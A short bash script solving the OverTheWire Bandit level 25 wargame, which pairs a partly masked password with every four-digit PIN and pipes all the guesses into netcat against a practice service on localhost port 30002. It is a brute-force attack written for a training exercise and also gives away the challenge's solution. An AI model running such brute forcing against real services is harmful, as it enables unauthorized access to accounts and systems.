#!/bin/bash

# brute forcing localhost 30002 with netcat
# WARNING!!: contains spoilers for https://overthewire.org/wargames/bandit/bandit25.html

# pass gained from previous level
pass=UoMY............................
# empty array
combos=()

# loop thru all 4 digit pin combos
for i in {0000..9999}; do
  # add pass and pin combo to array
  combos+=($pass $i)
done

# print out all pass + pin combos from our array and pipe into netcat
printf "%s %s\n" "${combos[@]}" | nc localhost 30002
